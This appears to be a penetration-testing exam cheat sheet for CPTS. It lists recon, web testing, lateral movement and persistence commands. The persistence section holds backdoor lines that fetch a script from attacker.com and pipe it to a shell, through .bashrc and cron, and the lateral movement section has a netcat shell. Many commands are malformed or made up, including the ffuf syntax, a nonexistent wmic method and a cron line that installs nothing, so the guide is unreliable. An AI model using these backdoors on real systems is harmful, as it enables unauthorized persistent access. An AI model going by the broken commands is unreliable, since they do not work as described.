# CPTS SURVIVAL GUIDE: Mindset & Methodology

## CORE MINDSET
Stop reading. Start executing.

CPTS is not a theory test. It is an engineering challenge.
You are building a weaponized chain from Recon to Lateral Movement.

## EXAM STRATEGY
1. Recon first: If you can't see the surface, you can't find the hole.
2. Verify: Assume nothing.
3. Automate: Write a script before the exam if possible to save time.
4. Timebox: 60 minutes per task.

## ATTACK WORKFLOW
1. Discovery: Map the footprint.
2. Enumeration: Map subdomains and services.
3. Exploitation: Leverage known vulnerabilities.
4. Persistence: Maintain access.
5. Privilege Escalation: Gain root or domain admin.

## COMMAND REFERENCE (Copy/Paste)
## Target: {target}

## 01. Recon & Enumeration
* **Port Scan:** nmap -sC -sV -T4 --script vuln {target}
* **Service Versions:** nmap -p- {target}
* **Web Fuzzing:** ffuf -u http://FU{target}/FU- -w /wordlist.txt -T
* **Subdomain DZ:** gobuster dns -u {target} -w /wordlist.txt

## 02. Web Vulnerability Testing
* **Headers:** curl -I {target}
* **Payload:** curl -X POST -d "admin={target}" {target}
* **XSS:** curl {target} /search?q=<script>alert(1)</script>
* **IDOR:** curl -H "Cookie: session_id=ID{target}" {target}

## 03. Lateral Movement
* **Netcat:** nc -nlvp -e /bin/bash {target} {port}
* **SSH:** ssh -o PreferredAuthentications=keyboard-interactive -i {id_rsa} user@{target}
* **WMI:** wmic.exe /namespace/root\\default path Win32_ComputerSystem Call GetLocalAdmin

## 04. Persistence
* **Shell:** echo -e 'curl http://attacker.com/rev | /bin/bash' >> /root/.bashrc
* **Cron:** crontab -e && echo "*/5 * * * * curl -s http://attacker.com/rev | /bin/sh" > /tmp/x

## TIPS & SHORTCUTS
1. Use Wordlists: seclists/ is king.
2. Check for NAL: Always look for NAL logs or alerts.
3. Use Python: subprocess is faster than shell commands in scripts.
4. Flags: -T4 for Nmap, -v for verbose.

## COMMON MISTAKES
1. Scanning without filtering.
2. Ignoring subdomains.
3. Skipping service version checks.
4. Forgetting to verify access.

## MINI SCRIPT (Bash)
#!/bin/bash
# Replace TARGET with variable
{target}
nmap -sC -sV -T4 --script vuln {target}
ffuf -u http://FU{target}/FU- -w /wordlist.txt -T
gobuster dns -u {target} -w /wordlist.txt
curl -I {target}
